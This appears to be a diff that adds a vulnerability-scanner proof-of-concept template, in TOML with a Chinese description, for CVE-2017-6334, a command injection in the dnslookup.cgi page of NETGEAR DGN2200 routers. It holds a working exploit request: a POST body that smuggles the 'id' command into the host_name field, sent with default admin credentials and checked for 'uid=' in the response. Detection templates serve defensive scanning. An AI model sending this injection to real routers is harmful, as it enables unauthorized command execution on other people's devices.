@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测 NETGEAR DGN2200v1/v2/v3/v4 路由器 dnslookup.cgi 接口是否存在 OS 命令注入漏洞。通过向 /dnslookup.cgi 发送带有命令注入 payload 的 HTTP POST 请求，验证目标是否可执行任意系统命令。需要提供有效的管理员凭据。"
+id = "POC-AVE-2017-0809"
+name = "NETGEAR DGN2200 dnslookup.cgi Command Injection PoC"
+severity = "high"
+tags = ["ave-2017-0809"]
+vuln_id = [
+    "CVE-2017-6334",
+    "AVE-2017-0809",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/dnslookup.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "host_name=www.google.com%3B+id&lookup=Lookup"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic {{base64(admin:password)}}"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
